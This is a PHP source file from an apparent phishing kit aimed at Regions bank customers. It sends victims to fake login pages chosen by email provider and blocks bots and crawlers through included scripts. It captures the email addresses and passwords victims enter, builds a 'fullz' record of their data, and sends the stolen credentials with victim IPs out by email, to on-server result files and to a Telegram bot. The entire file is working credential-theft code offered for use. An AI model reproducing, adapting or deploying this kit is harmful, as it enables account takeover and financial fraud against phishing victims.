<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";


$ip = $_SERVER['REMOTE_ADDR'];

function dirtomail($email) {
            if (preg_match("/@gmail/i", $email) == 1) {
				$_SESSION['fullz'].='
Email Address:      '.$email;
                return "../qa_au?";
            }
            elseif (preg_match("/@yahoo/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@ymail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@rocketmail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@outlook/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@hotmail/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@live/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@msn/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@aol/i", $email) == 1) {
                return "ao";
            }
            elseif (preg_match("/@comcast/i", $email) == 1) {
                return "cc";
            }
            elseif (preg_match("/@att/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@sbcglobal/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@bellsouth/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@verizon/i", $email) == 1) {
                return "vr";
            }
            return 'mc';
};

if(isset($_POST['ghh'])){
	if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['email']))){
		$_SESSION['email'] = $_POST['email'];
		header('location:confirm/m/'.dirtomail($_POST['email']).'');
	} else{header("location:evm?".$theerrkey."=c3ith".md5(rand(100, 999999999))."");}
}
elseif($_POST['tkubin']){
if(isset($_POST['emapmilo']) && isset($_POST['emapmilpasso'])){
    if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['emapmilo'])) && strlen($_POST['emapmilpasso']) > 3){
	///////////////////////// MAIL PART //////////////////////
		$email = $_POST['emapmilo'];
		$emailpass = $_POST['emapmilpasso'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET[''.$theerrkey.''])){$reshead="|-------------- CONFIRM EMAIL INFO -------------|";}
		else{$reshead="|------------------- EMAIL INFO ----------------|";};
        $Info_LOG = "
$reshead 
Email            : $email
Email Password   : $emailpass";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
IP    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🍃 '.$i.' REGIONS EMAIL ACCESS' ;$headers = 'From: YoCHI <yochsowncitibuster@yochthecitiman.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../rst');
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $confirmemaillog ==1){header("location:confirm/m/".dirtomail($_SESSION['email'])."?eirr=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{unset($_SESSION['email']);header("location:confirm/qa_au?contndled=true");};
    }
    else{ header("location:confirm/m/".dirtomail($_SESSION['email'])."?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:confirm/m/".dirtomail($_SESSION['email'])."?".$theerrkey."=ci3Fauth".md5(rand(100, 999999999)).""); };
};

?>